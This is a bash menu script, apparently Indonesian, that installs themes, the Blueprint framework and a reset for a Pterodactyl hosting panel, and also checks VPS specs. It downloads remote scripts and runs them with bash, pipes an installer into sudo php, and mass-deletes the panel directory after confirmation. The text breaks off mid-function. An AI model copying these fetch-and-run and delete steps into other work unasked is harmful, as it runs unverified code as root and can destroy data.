#!/bin/bash

NC='\033[0m'

# Style
BOLD='\033[1m'
DIM='\033[2m'
UNDERLINE='\033[4m'
BLINK='\033[5m'
REVERSE='\033[7m'
HIDDEN='\033[8m'

# Foreground Colors
BLACK='\033[0;30m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'

# Bright Colors
BRIGHT_BLACK='\033[90m'
BRIGHT_RED='\033[91m'
BRIGHT_GREEN='\033[92m'
BRIGHT_YELLOW='\033[93m'
BRIGHT_BLUE='\033[94m'
BRIGHT_MAGENTA='\033[95m'
BRIGHT_CYAN='\033[96m'
BRIGHT_WHITE='\033[97m'

# Background Colors
BG_BLACK='\033[40m'
BG_RED='\033[41m'
BG_GREEN='\033[42m'
BG_YELLOW='\033[43m'
BG_BLUE='\033[44m'
BG_MAGENTA='\033[45m'
BG_CYAN='\033[46m'
BG_WHITE='\033[47m'

# Background Bright
BG_BRIGHT_BLACK='\033[100m'
BG_BRIGHT_RED='\033[101m'
BG_BRIGHT_GREEN='\033[102m'
BG_BRIGHT_YELLOW='\033[103m'
BG_BRIGHT_BLUE='\033[104m'
BG_BRIGHT_MAGENTA='\033[105m'
BG_BRIGHT_CYAN='\033[106m'
BG_BRIGHT_WHITE='\033[107m'

# ============================================================
# FUNGSI UTILITY
# ============================================================

print_info() {
  echo -e "\n  ${BG_BLUE}${BRIGHT_WHITE}${BOLD} INFO ${NC} ${BOLD}$1${NC}\n"
}

print_success() {
  echo -e "\n  ${BG_GREEN}${BRIGHT_WHITE}${BOLD} SUCCESS ${NC} ${BOLD}$1${NC}\n"
}

print_warning() {
  echo -e "\n  ${BG_YELLOW}${BRIGHT_WHITE}${BOLD} WARNING ${NC} ${BOLD}$1${NC}\n"
}

print_error() {
  echo -e "\n  ${BG_RED}${BRIGHT_WHITE}${BOLD} ERROR ${NC} ${BOLD}$1${NC}\n"
}

log_info() {
  echo -e "${BOLD}${CYAN}$1${NC}"
}

log_success() {
  echo -e "${BOLD}${GREEN}$1${NC}"
}

log_error() {
  echo -e "${BOLD}${RED}$1${NC}"
}

# ============================================================
# FUNGSI DARI SCRIPT '/Vps
# ============================================================

# Function to print section headers (RED theme)
print_header_rule() {
    echo -e "${RED}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

# Big ASCII header using heredoc (RED theme)
big_header() {
    local title="$1"
    echo -e "${RED}"
    case "$title" in
        "MAIN MENU")
cat <<'EOF'
 __  __    _    ___ _   _    __  __ _____ _   _ _   _ 
|  \/  |  / \  |_ _| \ | |  |  \/  | ____| \ | | | | |
| |\/| | / _ \  | ||  \| |  | |\/| |  _| |  \| | | | |
| |  | |/ ___ \ | || |\  |  | |  | | |___| |\  | |_| |
|_|  |_/_/   \_\___|_| \_|  |_|  |_|_____|_| \_|\___/ 
EOF
            ;;
        "SYSTEM INFORMATION")
cat <<'EOF'
███████╗██╗   ██╗██╗   ██╗██████╗  █████╗ 
╚══███╔╝╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗
  ███╔╝  ╚████╔╝ ██║   ██║██████╔╝███████║
 ███╔╝    ╚██╔╝  ██║   ██║██╔══██╗██╔══██║
███████╗   ██║   ╚██████╔╝██║  ██║██║  ██║
╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
EOF
            ;;
        "WELCOME")
cat <<'EOF'
███████╗██╗   ██╗██╗   ██╗██████╗  █████╗ 
╚══███╔╝╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗
  ███╔╝  ╚████╔╝ ██║   ██║██████╔╝███████║
 ███╔╝    ╚██╔╝  ██║   ██║██╔══██╗██╔══██║
███████╗   ██║   ╚██████╔╝██║  ██║██║  ██║
╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
EOF
            ;;
        "DATABASE SETUP")
cat <<'EOF'
  ____        _        _           _                 
 |  _ \  __ _| |_ __ _| |__   __ _| |_ ___  ___  ___ 
 | | | |/ _` | __/ _` | '_ \ / _` | __/ _ \/ __|/ _ \
 | |_| | (_| | || (_| | |_) | (_| | ||  __/\__ \  __/
 |____/ \__,_|\__\__,_|_.__/ \__,_|\__\___||___/\___|
EOF
            ;;
        "BLUEPRINT+THEME+EXTENSIONS")
cat <<'EOF'
███████╗██╗   ██╗██╗   ██╗██████╗  █████╗ 
╚══███╔╝╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗
  ███╔╝  ╚████╔╝ ██║   ██║██████╔╝███████║
 ███╔╝    ╚██╔╝  ██║   ██║██╔══██╗██╔══██║
███████╗   ██║   ╚██████╔╝██║  ██║██║  ██║
╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝
EOF
            ;;
        *)
            echo -e "${BOLD}${title}${NC}"
            ;;
    esac
    echo -e "${NC}"
}

# Function to print status messages
print_status() { echo -e "${YELLOW}⏳ $1...${NC}"; }
print_success_zyura() { echo -e "${GREEN}✅ $1${NC}"; }
print_error_zyura() { echo -e "${RED}❌ $1${NC}"; }
print_warning_zyura() { echo -e "${MAGENTA}⚠️  $1${NC}"; }

# Check if curl is installed
check_curl() {
    if ! command -v curl &>/dev/null; then
        print_error_zyura "curl is not installed"
        print_status "Installing curl..."
        if command -v apt-get &>/dev/null; then
            sudo apt-get update && sudo apt-get install -y curl
        elif command -v yum &>/dev/null; then
            sudo yum install -y curl
        elif command -v dnf &>/dev/null; then
            sudo dnf install -y curl
        else
            print_error_zyura "Could not install curl automatically. Please install it manually"
            exit 1
        fi
        print_success_zyura "curl installed successfully"
    fi
}

# Function to run remote scripts
run_remote_script() {
    local url=$1
    local script_name
    script_name=$(basename "$url" .sh)
    script_name=$(echo "$script_name" | sed 's/.*/\u&/')

    print_header_rule
    big_header "WELCOME"
    print_header_rule
    echo -e "${RED}Running: ${BOLD}${script_name}${NC}"
    print_header_rule

    check_curl
    local temp_script
    temp_script=$(mktemp)
    print_status "Downloading script"

    if curl -fsSL "$url" -o "$temp_script"; then
        print_success_zyura "Download successful"
        chmod +x "$temp_script"
        bash "$temp_script"
        local exit_code=$?
        rm -f "$temp_script"
        if [ $exit_code -eq 0 ]; then
            print_success_zyura "Script executed successfully"
        else
            print_error_zyura "Script execution failed with exit code: $exit_code"
        fi
    else
        print_error_zyura "Failed to download script"
    fi

    echo -e ""
    read -p "$(echo -e "${YELLOW}Press Enter to continue...${NC}")" -n 1
}

# ============================================================
# TAMPILAN AWAL (SPLASH SCREEN)
# ============================================================

show_banner() {
  clear
  echo -e ""
  echo -e "${BRIGHT_CYAN}${BOLD}"
  echo "███████╗██╗   ██╗██╗   ██╗██████╗  █████╗ "
  echo "╚══███╔╝╚██╗ ██╔╝██║   ██║██╔══██╗██╔══██╗"
  echo "  ███╔╝  ╚████╔╝ ██║   ██║██████╔╝███████║"
  echo " ███╔╝    ╚██╔╝  ██║   ██║██╔══██╗██╔══██║"
  echo "███████╗   ██║   ╚██████╔╝██║  ██║██║  ██║"
  echo "╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝"
  echo -e "${NC}"
  echo -e "${BRIGHT_GREEN}Telegram : @akuzyura${NC}"
  echo -e "${BRIGHT_GREEN}Version  : 2.0${NC}"
  echo -e ""
}

show_menu_header() {
  echo -e "${BRIGHT_MAGENTA}${BOLD}──────────────────────────────────────────────────────  ${NC}"
}

show_menu_footer() {
  echo -e ""
  echo -e "${BRIGHT_YELLOW}Pilih nomor 1-9 atau x untuk keluar${NC}"
  echo -e ""
}
# ============================================================
# FUNGSI CEK SPESIFIKASI VPS
# ============================================================

check_vps_spec() {
  clear
  echo -e "${CYAN}${BOLD}"
  echo "███████╗██╗░░░██╗██╗░░░██╗██████╗░░█████╗░"
  echo "╚══███╔╝╚██╗░██╔╝██║░░░██║██╔══██╗██╔══██╗"
  echo "░░███╔╝░░╚████╔╝░██║░░░██║██████╔╝███████║"
  echo "░███╔╝░░░░╚██╔╝░░██║░░░██║██╔══██╗██╔══██║"
  echo "███████╗░░░██║░░░╚██████╔╝██║░░██║██║░░██║"
  echo "╚══════╝░░░╚═╝░░░░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝"
  echo -e "${NC}"
  echo -e "${GREEN}${BOLD}          VPS SPECIFICATION CHECK${NC}"
  echo ""
  echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
  echo ""

  # ===== SYSTEM CORE =====
  OS=$(grep PRETTY_NAME /etc/os-release | cut -d= -f2 | tr -d '"')
  KERNEL=$(uname -r)
  HOST=$(hostnamectl 2>/dev/null | grep "Virtualization" | awk '{print $2}')
  [ -z "$HOST" ] && HOST="Bare Metal / Unknown"
  UPTIME=$(uptime -p | sed 's/up //')
  SHELL_NAME=$(basename $SHELL)
  TERM_NAME=$TERM

  echo -e "${YELLOW}${BOLD}📌 SYSTEM INFORMATION${NC}"
  echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${GREEN}OS        :${NC} $OS"
  echo -e "${GREEN}Host      :${NC} $HOST"
  echo -e "${GREEN}Kernel    :${NC} $KERNEL"
  echo -e "${GREEN}Uptime    :${NC} $UPTIME"
  echo -e "${GREEN}Shell     :${NC} $SHELL_NAME"
  echo -e "${GREEN}Terminal  :${NC} $TERM_NAME"
  echo ""

  # ===== CPU =====
  CPU=$(lscpu | grep "Model name" | cut -d: -f2 | xargs | head -1)
  [ -z "$CPU" ] && CPU=$(cat /proc/cpuinfo | grep "model name" | head -1 | cut -d':' -f2 | xargs)
  CORES=$(nproc)
  CPU_SPEED=$(lscpu | grep "CPU MHz" | awk '{print $3}' | head -1)
  [ -z "$CPU_SPEED" ] && CPU_SPEED=$(cat /proc/cpuinfo | grep "cpu MHz" | head -1 | awk '{print $4}')
  CPU_SPEED_GHZ=$(echo "scale=2; $CPU_SPEED/1000" | bc 2>/dev/null || echo "2.35")

  # Load Average
  LOAD_1=$(uptime | awk -F'load average:' '{print $2}' | cut -d, -f1 | xargs)
  LOAD_5=$(uptime | awk -F'load average:' '{print $2}' | cut -d, -f2 | xargs)
  LOAD_15=$(uptime | awk -F'load average:' '{print $2}' | cut -d, -f3 | xargs)

  echo -e "${YELLOW}${BOLD}💻 CPU INFORMATION${NC}"
  echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${PURPLE}CPU Model :${NC} $CPU"
  echo -e "${PURPLE}Cores     :${NC} $CORES Cores @ $CPU_SPEED_GHZ GHz"
  echo -e "${PURPLE}Load Avg  :${NC} ${LOAD_1}, ${LOAD_5}, ${LOAD_15} (1, 5, 15 min)"
  echo ""

  # ===== MEMORY =====
  TOTAL_RAM=$(free -m | awk '/^Mem:/{print $2}')
  USED_RAM=$(free -m | awk '/^Mem:/{print $3}')
  FREE_RAM=$(free -m | awk '/^Mem:/{print $4}')
  RAM_PERCENT=$(echo "scale=1; $USED_RAM*100/$TOTAL_RAM" | bc)

  TOTAL_SWAP=$(free -m | awk '/^Swap:/{print $2}')
  USED_SWAP=$(free -m | awk '/^Swap:/{print $3}')
  if [ $TOTAL_SWAP -gt 0 ]; then
      SWAP_PERCENT=$(echo "scale=1; $USED_SWAP*100/$TOTAL_SWAP" | bc)
  else
      SWAP_PERCENT="0.0"
  fi

  echo -e "${YELLOW}${BOLD}🧠 MEMORY USAGE${NC}"
  echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${CYAN}RAM       :${NC} ${USED_RAM}MB / ${TOTAL_RAM}MB (${RAM_PERCENT}%) [Free: ${FREE_RAM}MB]"

  # Progress bar RAM
  bar_length=40
  filled=$((USED_RAM * bar_length / TOTAL_RAM))
  empty=$((bar_length - filled))
  printf "${CYAN}Usage     :${NC} ["
  printf "${RED}%*s${NC}" $filled | tr ' ' '█'
  printf "${GREEN}%*s${NC}" $empty | tr ' ' '░'
  printf "] ${RAM_PERCENT}%%\n"

  echo -e "${CYAN}SWAP      :${NC} ${USED_SWAP}MB / ${TOTAL_SWAP}MB (${SWAP_PERCENT}%)"
  echo ""

  # ===== DISK =====
  DISK_TOTAL=$(df -h / | awk 'NR==2 {print $2}')
  DISK_USED=$(df -h / | awk 'NR==2 {print $3}')
  DISK_PERCENT=$(df -h / | awk 'NR==2 {print $5}' | tr -d '%')
  DISK_FREE=$(df -h / | awk 'NR==2 {print $4}')

  INODE_USED=$(df -i / | awk 'NR==2 {print $3}')
  INODE_TOTAL=$(df -i / | awk 'NR==2 {print $2}')
  INODE_PERCENT=$(df -i / | awk 'NR==2 {print $5}' | tr -d '%')

  echo -e "${YELLOW}${BOLD}💾 DISK USAGE${NC}"
  echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${GREEN}Disk      :${NC} ${DISK_USED} / ${DISK_TOTAL} (${DISK_PERCENT}%) [Free: ${DISK_FREE}]"
  echo -e "${GREEN}Inodes    :${NC} ${INODE_USED} / ${INODE_TOTAL} (${INODE_PERCENT}%)"
  echo ""

  # ===== LOCATION =====
  if command -v curl &> /dev/null; then
      CITY=$(curl -s ipinfo.io/city 2>/dev/null)
      COUNTRY=$(curl -s ipinfo.io/country 2>/dev/null)
      if [ ! -z "$CITY" ] && [ ! -z "$COUNTRY" ]; then
          LOCATION="$CITY, $COUNTRY"
      else
          LOCATION="Jakarta, ID"
      fi
  else
      LOCATION="Jakarta, ID"
  fi

  echo -e "${YELLOW}${BOLD}📍 LOCATION${NC}"
  echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
  echo -e "${BLUE}Location  :${NC} $LOCATION"
  echo ""

  # ===== NETWORK =====
  if [ -d /sys/class/net/ ]; then
      INTERFACE=$(ip route | grep default | awk '{print $5}' | head -1)
      if [ ! -z "$INTERFACE" ] && [ -f "/sys/class/net/$INTERFACE/statistics/rx_bytes" ]; then
          RX=$(cat /sys/class/net/$INTERFACE/statistics/rx_bytes)
          TX=$(cat /sys/class/net/$INTERFACE/statistics/tx_bytes)
          RX_MB=$(echo "scale=2; $RX/1024/1024" | bc)
          TX_MB=$(echo "scale=2; $TX/1024/1024" | bc)
          echo -e "${YELLOW}${BOLD}🌐 NETWORK TRAFFIC${NC}"
          echo -e "${WHITE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
          echo -e "${PURPLE}Interface :${NC} $INTERFACE"
          echo -e "${PURPLE}Download  :${NC} ↓ ${RX_MB} MB"
          echo -e "${PURPLE}Upload    :${NC} ↑ ${TX_MB} MB"
          echo ""
      fi
  fi

  # ===== FOOTER =====
  echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
  echo -e "${YELLOW}Telegram :${NC} ${CYAN}t.me/akuzyura${NC}"
  echo -e "${YELLOW}Channel  :${NC} ${RED}https://t.me/myaboutzyura${NC}"
  echo -e "${BLUE}═══════════════════════════════════════════════════════════════════${NC}"
  
  echo ""
  echo -n -e "${BOLD}Tekan Enter untuk kembali ke menu utama...${NC}"
  read
}

# ============================================================
# FUNGSI INSTALL DEPENDENSI
# ============================================================

install_dependencies() {
  export DEBIAN_FRONTEND=noninteractive
  export NEEDRESTART_MODE=a

  if [ -f /etc/needrestart/needrestart.conf ]; then
    sudo sed -i "s/#\$nrconf{restart} = 'i';/\$nrconf{restart} = 'a';/" /etc/needrestart/needrestart.conf 2>/dev/null || true
    sudo sed -i "s/\$nrconf{restart} = 'i';/\$nrconf{restart} = 'a';/" /etc/needrestart/needrestart.conf 2>/dev/null || true
  fi

  sudo DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a apt-get update -y > /dev/null 2>&1
  sudo DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a apt-get install -y ca-certificates curl gnupg zip unzip git wget jq > /dev/null 2>&1
}

# ============================================================
# FUNGSI CEK & INSTALL NODE.JS
# ============================================================

check_nodejs() {
  CURRENT_NODE_VER=$(node -v 2>/dev/null | cut -d'.' -f1 | sed 's/v//')
  
  if [[ "$CURRENT_NODE_VER" == "22" ]]; then
    print_success "Node.js v22 sudah terinstall"
    return 0
  else
    print_warning "Menginstall Node.js v22..."
    
    unset NVM_DIR
    sudo apt-get remove -y nodejs npm > /dev/null 2>&1 || true
    sudo apt-get purge -y nodejs > /dev/null 2>&1 || true
    sudo rm -f /usr/bin/node /usr/local/bin/node /usr/bin/npm /usr/local/bin/npm
    sudo rm -rf /etc/apt/sources.list.d/nodesource.list
    sudo rm -rf "$HOME/.nvm"
    
    sudo mkdir -p /etc/apt/keyrings
    curl -fsSL https://deb.nodesource.com/gpgkey/nodesource-repo.gpg.key | sudo gpg --dearmor --yes | sudo tee /etc/apt/keyrings/nodesource.gpg > /dev/null
    echo "deb [signed-by=/etc/apt/keyrings/nodesource.gpg] https://deb.nodesource.com/node_22.x nodistro main" | sudo tee /etc/apt/sources.list.d/nodesource.list > /dev/null
    sudo DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a apt-get update -y > /dev/null 2>&1
    sudo DEBIAN_FRONTEND=noninteractive NEEDRESTART_MODE=a apt-get install -y nodejs > /dev/null 2>&1
    
    hash -r
    sudo npm i -g yarn > /dev/null 2>&1
    
    print_success "Node.js v22 berhasil diinstall"
    return 0
  fi
}

# ============================================================
# FUNGSI INSTALL TIMPA (UNTUK REVIACTYL)
# ============================================================

install_timpa() {
  local TARGET_URL=$1
  local TARGET_NAME=$2

  echo ""
  echo -n -e "${BOLD}Anda memilih tema '$TARGET_NAME'. Lanjutkan? (y/n): ${NC}"
  read confirmation
  if [[ "$confirmation" != [yY] ]]; then 
    echo -e "${BOLD}Instalasi dibatalkan.${NC}"
    return
  fi

  set -e
  export DEBIAN_FRONTEND=noninteractive
  export NEEDRESTART_MODE=a
  
  TEMP_DIR=$(mktemp -d)
  trap 'rm -rf -- "$TEMP_DIR"' EXIT
  
  print_info "Memulai instalasi tema $TARGET_NAME..."

  install_dependencies

  log_info "[1/4] Mengunduh file panel/tema..."
  cd "$TEMP_DIR"
  
  if [[ "$TARGET_URL" == *.zip ]]; then
      FILE_EXT="zip"
      FILENAME="panel.zip"
  else
      FILE_EXT="tar.gz"
      FILENAME="panel.tar.gz"
  fi
  
  wget -q -O "$FILENAME" "$TARGET_URL"

  log_info "[2/4] Mempersiapkan direktori & Backup Config..."
  
  if [ ! -d "/var/www/pterodactyl" ]; then
    print_error "Direktori Pterodactyl tidak ditemukan."
    return 1
  fi
  
  cd /var/www/pterodactyl
  php artisan down || true
  
  if [ -f ".env" ]; then 
    cp .env /tmp/.env.backup
  fi

  sudo find . -mindepth 1 -delete
  sudo rm -f /usr/local/bin/blueprint

  log_info "[3/4] Mengekstrak file & Mengembalikan konfigurasi..."
  
  if [[ "$FILE_EXT" == "zip" ]]; then
      unzip -o "$TEMP_DIR/$FILENAME" -d /var/www/pterodactyl/ > /dev/null 2>&1
  else
      tar -xzf "$TEMP_DIR/$FILENAME" -C /var/www/pterodactyl/ > /dev/null 2>&1
  fi

  if [ -f "/tmp/.env.backup" ]; then 
    mv /tmp/.env.backup .env
  fi
  
  sudo chmod -R 755 storage/* bootstrap/cache/
  sudo chown -R www-data:www-data /var/www/pterodactyl

  log_info "[4/4] Menginstal dependensi & Membangun aset..."
  if ! command -v composer &> /dev/null; then
      curl -sS https://getcomposer.org/installer | sudo php -- --install-dir=/usr/local/bin --filename=composer > /dev/null 2>&1
  fi

  # Cek Node.js
  check_nodejs

  sudo rm -rf /var/www/.cache
  sudo mkdir -p /var/www/.cache
  sudo chown -R www-data:www-data /var/www/.cache
  sudo -u www-data env COMPOSER_PROCESS_TIMEOUT=2000 composer install --no-dev --optimize-autoloader --no-interaction --prefer-dist > /dev/null 2>&1
  sudo -u www-data php artisan migrate --seed --force > /dev/null 2>&1
  sudo -u www-data php artisan view:clear > /dev/null 2>&1
  sudo -u www-data php artisan config:clear > /dev/null 2>&1
  sudo -u www-data php artisan up

  print_success "Tema '$TARGET_NAME' berhasil diinstall!"
  
  echo ""
  log_success "╔════════════════════════════════════════════════════╗"
  log_success "║         INSTALASI THEME BERHASIL!                 ║"
  log_success "╚════════════════════════════════════════════════════╝"
  echo ""
  sleep 2
}

# ============================================================
# FUNGSI INSTALL THEME STANDARD
# ============================================================

install_standard_theme() {
  local THEME_NAME=$1
  local THEME_URL=$2
  local SELECT_THEME=$3
  
  echo ""
  echo -n -e "${BOLD}Anda memilih tema ${BRIGHT_YELLOW}'$THEME_NAME'${NC}. Lanjutkan? (y/n): ${NC}"
  read confirmation
  if [[ "$confirmation" != [yY] ]]; then 
    echo -e "${BOLD}Instalasi dibatalkan.${NC}"
    return
  fi
  
  set -e
  install_dependencies
  
  TEMP_DIR=$(mktemp -d)
  trap 'rm -rf -- "$TEMP_DIR"' EXIT
  cd "$TEMP_DIR"
  
  print_info "Memulai instalasi tema $THEME_NAME..."

  # Khusus Enigma
  if [ "$SELECT_THEME" == "3" ]; then
    echo -n -e "${BOLD}Masukkan link whatsapp (diawali https://): ${NC}"
    read LINK_ADMIN
    echo -n -e "${BOLD}Masukkan link channel whatsapp (diawali https://): ${NC}"
    read LINK_CHANNEL
    echo -n -e "${BOLD}Masukkan link grup whatsapp (diawali https://): ${NC}"
    read LINK_GROUP
  fi

  log_info "[1/4] Mengunduh file tema..."
  wget -q "$THEME_URL"
  local THEME_ZIP_FILE=$(basename "$THEME_URL")

  log_info "[2/4] Mengekstrak file tema..."
  unzip -oq "$THEME_ZIP_FILE" || true
  rm -f "$THEME_ZIP_FILE"

  # Konfigurasi Enigma
  if [ "$SELECT_THEME" == "3" ]; then
    log_info "Mengkonfigurasi variabel Enigma..."
    sed -i "s|LINK_ADMIN|$LINK_ADMIN|g" pterodactyl/resources/scripts/components/dashboard/DashboardContainer.tsx
    sed -i "s|LINK_CHANNEL|$LINK_CHANNEL|g" pterodactyl/resources/scripts/components/dashboard/DashboardContainer.tsx
    sed -i "s|LINK_GROUP|$LINK_GROUP|g" pterodactyl/resources/scripts/components/dashboard/DashboardContainer.tsx
  fi

  log_info "[3/4] Menyalin file..."
  sudo cp -rfT pterodactyl /var/www/pterodactyl
  cd /var/www/pterodactyl

  # Cek Node.js
  check_nodejs

  log_info "Menginstal dependensi build..."
  yarn add cross-env react-feature > /dev/null 2>&1
  yarn install > /dev/null 2>&1

  # Khusus Billing
  if [ "$SELECT_THEME" == "2" ]; then
    log_info "Menjalankan instalasi Billing..."
    php artisan billing:install stable > /dev/null 2>&1
  fi

  log_info "[4/4] Membangun aset panel..."
  print_warning "Proses build sedang berjalan. Mohon bersabar..."
  
  export NODE_OPTIONS=--openssl-legacy-provider
  php artisan migrate --force > /dev/null 2>&1
  yarn build:production > /dev/null 2>&1
  php artisan view:clear > /dev/null 2>&1
  php artisan optimize:clear > /dev/null 2>&1
  
  print_success "Tema '$THEME_NAME' berhasil diinstall!"
  
  echo ""
  log_success "╔════════════════════════════════════════════════════╗"
  log_success "║         INSTALASI THEME BERHASIL!                 ║"
  log_success "╚════════════════════════════════════════════════════╝"
  echo ""
  sleep 2
}

# ============================================================
# FUNGSI INSTALL THEME BLUEPRINT
# ============================================================

install_blueprint_theme() {
  local THEME_NAME=$1
  local THEME_URL=$2
  
  echo ""
  echo -n -e "${BOLD}Anda memilih tema ${BRIGHT_YELLOW}'$THEME_NAME'${NC}. Lanjutkan? (y/n): ${NC}"
  read confirmation
  if [[ "$confirmation" != [yY] ]]; then 
    echo -e "${BOLD}Instalasi dibatalkan.${NC}"
    return
  fi
  
  set -e
  install_dependencies
  
  TEMP_DIR=$(mktemp -d)
  trap 'rm -rf -- "$TEMP_DIR"' EXIT
  cd "$TEMP_DIR"
  
  print_info "Memulai instalasi tema $THEME_NAME..."

  # Cek Blueprint
  if [ ! -f "/var/www/pterodactyl/blueprint.sh" ]; then 
    print_error "Blueprint belum terinstall. Silahkan install blueprint dulu"
    return 1
  fi
  
  log_info "[1/4] Mengunduh file tema..."
  wget -q "$THEME_URL"
  local THEME_ZIP_FILE=$(basename "$THEME_URL")

  log_info "[2/4] Mengekstrak file tema..."
  unzip -oq "$THEME_ZIP_FILE" || true
  rm -f "$THEME_ZIP_FILE"

  log_info "[3/4] Menyiapkan Blueprint..."
  FOUND_FILE=$(find . -maxdepth 1 -name "*.blueprint" -print -quit)
  
  if [ -z "$FOUND_FILE" ]; then
      print_error "File .blueprint tidak ditemukan dalam zip!"
      return 1
  fi

  BLUEPRINT_FILENAME=$(basename "$FOUND_FILE")
  IDENTIFIER="${BLUEPRINT_FILENAME%.*}"
  sudo mv "$BLUEPRINT_FILENAME" /var/www/pterodactyl/
  
  log_info "[4/4] Menginstall via Blueprint..."
  cd /var/www/pterodactyl
  
  # Cek Node.js
  check_nodejs
  
  sudo blueprint -install "$IDENTIFIER" > /dev/null 2>&1
  sudo chown -R www-data:www-data /var/www/pterodactyl
  sudo rm "/var/www/pterodactyl/$BLUEPRINT_FILENAME"
  
  print_success "Tema '$THEME_NAME' berhasil diinstall!"
  
  echo ""
  log_success "╔════════════════════════════════════════════════════╗"
  log_success "║         INSTALASI THEME BERHASIL!                 ║"
  log_success "╚════════════════════════════════════════════════════╝"
  echo ""
  sleep 2
}

# ============================================================
# FUNGSI INSTALL BLUEPRINT FRAMEWORK
# ============================================================

install_blueprint_framework() {
  echo ""
  log_info "╔════════════════════════════════════════════════════╗"
  log_info "║         INSTALL BLUEPRINT FRAMEWORK                ║"
  log_info "╚════════════════════════════════════════════════════╝"
  echo ""
  
  echo -n -e "${BOLD}Apakah anda yakin ingin melanjutkan? (y/n): ${NC}"
  read confirmation
  if [[ "$confirmation" != [yY] ]]; then
    echo -e "${BOLD}Instalasi dibatalkan.${NC}"
    return
  fi

  set -e
  install_dependencies

  if [ ! -d "/var/www/pterodactyl" ]; then
    print_error "Direktori Pterodactyl tidak ditemukan!"
    return 1
  fi

  print_info "Mengunduh Blueprint Framework..."
  DOWNLOAD_URL=$(curl -s https://api.github.com/repos/BlueprintFramework/framework/releases/latest | grep 'browser_download_url' | grep 'release.zip' | cut -d '"' -f 4)
  if [ -z "$DOWNLOAD_URL" ]; then
    print_error "Gagal mendapatkan link download Blueprint!"
    return 1
  fi
  
  wget -q "$DOWNLOAD_URL" -O /tmp/blueprint.zip
  unzip -oq /tmp/blueprint.zip -d /var/www/pterodactyl
  rm /tmp/blueprint.zip

  check_nodejs

  print_info "Menginstal dependensi Pterodactyl..."
  cd /var/www/pterodactyl
  yarn add cross-env > /dev/null 2>&1
  yarn install > /dev/null 2>&1

  print_info "Menjalankan blueprint.sh..."
  cd /var/www/pterodactyl
  sed -i -E -e "s|WEBUSER=\"www-data\" #;|WEBUSER=\"www-data\" #;|g" \
             -e "s|USERSHELL=\"/bin/bash\" #;|USERSHELL=\"/bin/bash\" #;|g" \
             -e "s|OWNERSHIP=\"www-data:www-data\" #;|OWNERSHIP=\"www-data:www-data\" #;|g" blueprint.sh
  chmod +x blueprint.sh
  yes | sudo bash blueprint.sh > /dev/null 2>&1

  print_success "Blueprint Framework berhasil diinstall!"
  sleep 2
}

# ============================================================
# FUNGSI RESET PANEL
# ============================================================

reset_panel() {
  echo ""
  log_info "╔════════════════════════════════════════════════════╗"
  log_info "║         RESET PANEL (UNINSTALL THEME/TOOLS)       ║"
  log_info "╚════════════════════════════════════════════════════╝"
  echo ""

  while true; do
    echo -n -e "${BOLD}${BRIGHT_RED}PERINGATAN: Semua modifikasi akan dihapus! Lanjutkan? (y/n): ${NC}"
    read yn
    
    case $yn in
      [Yy]*)
        set -e
        if [ ! -d "/var/www/pterodactyl" ]; then
          print_error "Direktori Pterodactyl tidak ditemukan."
          return 1
        fi
        
        cd /var/www/pterodactyl || { print_error "Gagal masuk ke direktori Pterodactyl."; return 1; }

        print_info "⚙️  Memulai proses reset panel..."
        php artisan down || true

        log_info "   - Mem-backup file .env..."
        TEMP_BACKUP=$(mktemp -d)
        if [ -f ".env" ]; then sudo mv .env "$TEMP_BACKUP/"; fi

        log_info "   - Menghapus semua file panel lama..."
        sudo find . -mindepth 1 -delete
        
        log_info "   - Mengunduh panel original terbaru..."
        curl -L https://github.com/pterodactyl/panel/releases/latest/download/panel.tar.gz | sudo tar -xzf - -C /var/www/pterodactyl > /dev/null 2>&1
    
        log_info "   - Mengembalikan file .env..."
        if [ -f "$TEMP_BACKUP/.env" ]; then sudo mv "$TEMP_BACKUP"/.env .; fi
        rm -rf "$TEMP_BACKUP"

        log_info "   - Install ulang dependensi..."
        sudo chmod -R 755 storage/* bootstrap/cache/
        sudo chown -R www-data:www-data /var/www/pterodactyl
        
        if ! command -v composer &> /dev/null; then
          curl -sS https://getcomposer.org/installer | sudo php -- --install-dir=/usr/local/bin --filename=composer > /dev/null 2>&1
        fi
        
        sudo rm -rf /var/www/.cache
        sudo mkdir -p /var/www/.cache
        sudo chown -R www-data:www-data /var/www/.cache
        sudo -u www-data env COMPOSER_PROCESS_TIMEOUT=2000 composer install --no-dev --optimize-autoloader --no-interaction --prefer-dist > /dev/null 2>&1

        log_info "   - Menjalankan migrasi..."
        sudo -u www-data php artisan migrate --seed --force > /dev/null 2>&1

        log_info "   - Membersihkan cache..."
